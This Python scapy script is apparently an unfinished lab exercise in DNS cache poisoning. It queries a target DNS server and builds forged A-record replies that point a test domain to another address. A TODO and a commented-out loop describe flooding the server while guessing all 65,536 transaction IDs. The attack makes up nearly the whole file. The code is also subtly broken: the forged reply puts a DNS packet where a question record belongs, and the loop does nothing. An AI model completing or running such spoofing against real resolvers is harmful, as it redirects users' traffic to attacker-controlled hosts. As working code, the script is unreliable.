from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1
from socket import AF_INET, SOCK_DGRAM, socket
from traceback import print_exc
import threading

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1234))

targetaddr="192.168.56.101"

def request(url, addr):
	print("Requesting adress of {} from DNS Server running on {}".format(url, addr))
	answer = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url)),verbose=0)

	print(answer[DNS].summary())

def reply(id, url, addr):
	response = DNS(
		id=id, ancount=1, qr=1, aa=0, ra=0, rd=0,
		qdcount=1,
		qd=DNS(rd=1,qd=DNSQR(qname=url)),
		an=DNSRR(rrname=url, type='A', rdata="192.168.56.1", ttl=1234))
	sock.sendto(bytes(response), (addr, 53))

#TODO: Send DNS request async and start flooding the target dns server with fake answers using reply function and guessed ids


targeturl="abc1.asdfsdf.com"

#request(targeturl, targetaddr)

thr = threading.Thread(target=request, args=[targeturl, targetaddr])
thr.start()
i=0
while thr.is_alive() and i <= 65535:
#	reply(i, targeturl, targetaddr)
#	i+=1
	pass

if i>65535: 
	print("Tried all possible transaction ids without getting a reply. something went wrong :(")
